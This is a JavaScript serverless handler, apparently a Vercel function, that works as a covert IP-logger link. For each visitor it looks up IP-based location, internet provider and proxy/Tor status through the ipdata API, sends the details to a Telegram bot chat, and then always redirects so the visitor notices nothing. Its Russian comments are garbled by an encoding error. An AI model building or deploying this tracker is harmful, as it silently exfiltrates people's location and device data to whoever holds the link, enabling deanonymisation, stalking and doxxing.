// --- "–ñ–ï–õ–ï–ó–ù–ê–Ø" –í–ï–†–°–ò–Ø ---

const getFlagEmoji = (countryCode) => {
    if (!countryCode || countryCode.length !== 2) return 'üè≥Ô∏è';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
};

export default async function handler(req, res) {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    const IPDATA_API_KEY = process.env.IPDATA_API_KEY;
    const REDIRECT_URL = process.env.REDIRECT_URL;

    try {
        // --- –®–ê–ì 1: –ü–û–õ–£–ß–ï–ù–ò–ï –î–ê–ù–ù–´–• ---
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        const ipdataResponse = await fetch(`https://api.ipdata.co/${ip}?api-key=${IPDATA_API_KEY}`);
        if (!ipdataResponse.ok) {
            throw new Error(`ipdata API error: ${ipdataResponse.status}`);
        }
        const data = await ipdataResponse.json();
        
        // --- –®–ê–ì 2: –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM –ò –û–ñ–ò–î–ê–ù–ò–ï –û–¢–í–ï–¢–ê ---
        const flag = data.emoji_flag || getFlagEmoji(data.country_code);
        const message = `${flag} New Visit [Vercel2]:\nIP: ${data.ip}\nLocation: ${data.country_name}, ${data.region}, ${data.city}\nProvider: ${data.asn.name}\nThreat: Proxy: ${data.threat.is_proxy}, Tor: ${data.threat.is_tor}\nUser-Agent: ${userAgent}`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const telegramResponse = await fetch(telegramUrl);
        
        // --- –®–ê–ì 3: –ü–†–û–í–ï–†–ö–ê –û–¢–í–ï–¢–ê –û–¢ TELEGRAM ---
        if (!telegramResponse.ok) {
            const errorJson = await telegramResponse.json();
            throw new Error(`Telegram API error: ${telegramResponse.status} - ${JSON.stringify(errorJson)}`);
        }
        
        console.log("Telegram message sent successfully and confirmed.");

    } catch (error) {
        // –ï—Å–ª–∏ –ª—é–±–æ–π –∏–∑ —à–∞–≥–æ–≤ –≤—ã—à–µ –Ω–µ —É–¥–∞–ª—Å—è, –º—ã –ª–æ–≥–∏—Ä—É–µ–º –æ—à–∏–±–∫—É, –Ω–æ –ù–ï –ª–æ–º–∞–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç.
        console.error("Tracking process failed:", error);
    } finally {
        // --- –®–ê–ì 4: –ì–ê–†–ê–ù–¢–ò–†–û–í–ê–ù–ù–´–ô –†–ï–î–ò–†–ï–ö–¢ ---
        // –≠—Ç–æ—Ç –±–ª–æ–∫ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –í–°–ï–ì–î–ê: –∏ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏, –∏ –ø–æ—Å–ª–µ –æ—à–∏–±–∫–∏.
        // –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ –ª—é–±–æ–º —Å–ª—É—á–∞–µ –±—É–¥–µ—Ç –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω.
        console.log(`Redirecting to: ${REDIRECT_URL}`);
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.status(200).json({ redirectTo: REDIRECT_URL });
    }
}
